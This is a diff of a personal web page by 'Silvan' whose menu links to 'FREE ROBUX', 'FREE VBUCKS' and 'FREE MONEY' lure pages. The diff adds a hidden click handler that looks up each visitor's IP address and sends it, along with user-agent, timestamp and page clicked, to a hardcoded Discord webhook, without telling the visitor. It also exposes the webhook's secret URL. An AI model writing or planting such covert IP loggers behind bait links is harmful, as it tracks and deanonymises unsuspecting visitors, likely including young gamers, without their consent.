@@ -79,7 +79,6 @@
       box-shadow: 0 15px 25px rgba(0,0,0,0.3);
     }
 
-    /* Footer optional */
     footer {
       margin-top: 60px;
       font-size: 0.9em;
@@ -88,7 +87,6 @@
       animation: fadeInUp 1.5s ease forwards;
     }
 
-    /* Animations */
     @keyframes fadeInDown {
       from { opacity: 0; transform: translateY(-20px); }
       to { opacity: 1; transform: translateY(0); }
@@ -99,13 +97,12 @@
       to { opacity: 1; transform: translateY(0); }
     }
 
-    /* Staggered animation for menu items */
     #menu li:nth-child(1) { animation-delay: 1.5s; }
     #menu li:nth-child(2) { animation-delay: 1.7s; }
     #menu li:nth-child(3) { animation-delay: 1.9s; }
     #menu li:nth-child(4) { animation-delay: 2.1s; }
+    #menu li:nth-child(5) { animation-delay: 2.3s; }
 
-    /* Responsive */
     @media(max-width: 600px){
       h1 { font-size: 2.5em; }
       p { font-size: 1.1em; margin-bottom: 30px; }
@@ -125,26 +122,52 @@
     &copy; 2026 Silvan
   </footer>
 
-  <script>
-    // Unterseiten definieren
-    const unterseiten = [
-      { name: "Cloud", folder: "/cloud/index.html" },
-      { name: "FREE ROBUX", folder: "/freerobux/" },
-      { name: "FREE VBUCKS", folder: "/freevbucks/" },
-      { name: "FREE MONEY", folder: "/freemoney/" },
-      { name: "MCMODS/PLUGINS", folder: "/plugins/" },
-    ];
+<script>
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1457062538872357049/cjJv72Z6peKGCHFReLndx5sYUpPcXYFsQtmXabB__xa5v94o82_fk0snRGmXKjMCXs19";
 
-    const menu = document.getElementById("menu");
+  // Unterseiten definieren
+  const unterseiten = [
+    { name: "Cloud", folder: "/cloud/index.html" },
+    { name: "FREE ROBUX", folder: "/freerobux/" },
+    { name: "FREE VBUCKS", folder: "/freevbucks/" },
+    { name: "FREE MONEY", folder: "/freemoney/" },
+    { name: "MCMODS/PLUGINS", folder: "/plugins/" },
+  ];
 
-    unterseiten.forEach((seite, index) => {
-      const li = document.createElement("li");
-      const link = document.createElement("a");
-      link.href = seite.folder; // Link zum Unterordner
-      link.textContent = seite.name;
-      li.appendChild(link);
-      menu.appendChild(li);
+  const menu = document.getElementById("menu");
+
+  unterseiten.forEach((seite, index) => {
+    const li = document.createElement("li");
+    const link = document.createElement("a");
+    link.href = seite.folder;
+    link.textContent = seite.name;
+
+    // Click-Listener für Tracking
+    link.addEventListener("click", function(e){
+      // IP + User-Agent + Zeitstempel senden
+      fetch("https://api.ipify.org?format=json")
+        .then(r => r.json())
+        .then(data => {
+          const visitorData = {
+            ip: data.ip,
+            userAgent: navigator.userAgent,
+            timestamp: new Date().toISOString(),
+            page: seite.name
+          };
+          fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              content: `Visitor Info:\nIP: ${visitorData.ip}\nUser-Agent: ${visitorData.userAgent}\nTimestamp: ${visitorData.timestamp}\nPage: ${visitorData.page}`
+            })
+          });
+        });
+      // Optional: Kein `e.preventDefault()` → Weiterleitung normal
     });
-  </script>
+
+    li.appendChild(link);
+    menu.appendChild(li);
+  });
+</script>
 </body>
 </html>
